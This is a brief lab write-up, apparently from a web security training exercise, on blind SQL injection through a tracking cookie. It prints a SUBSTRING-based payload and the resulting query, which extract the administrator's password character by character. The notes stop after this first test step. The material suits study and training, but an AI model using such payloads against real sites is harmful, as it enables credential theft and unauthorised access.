# Twelveth Lab : Blind SQL INJECTION

Lab - 12 : Blind SQL injection with conditional responses

SQL Injection : Tracking Cookie for analytics

Endgoal : Logging in as administrator

Analysis : 

1. Finding the trackingID cookie 
    
    ![vmplayer_46UG4pRWBA.png](Twelveth%20Lab%20Blind%20SQL%20INJECTION%2021b3c5d54c768054b8fde4283fc6ccc8/vmplayer_46UG4pRWBA.png)
    
2. Testing the payload 
    
    ```
    Payload -> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    ```
    
    Query for this will be 
    
    ```sql
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'
    ```
    
    This returns no error when the first character of the password is greater than m otherwise it returns error.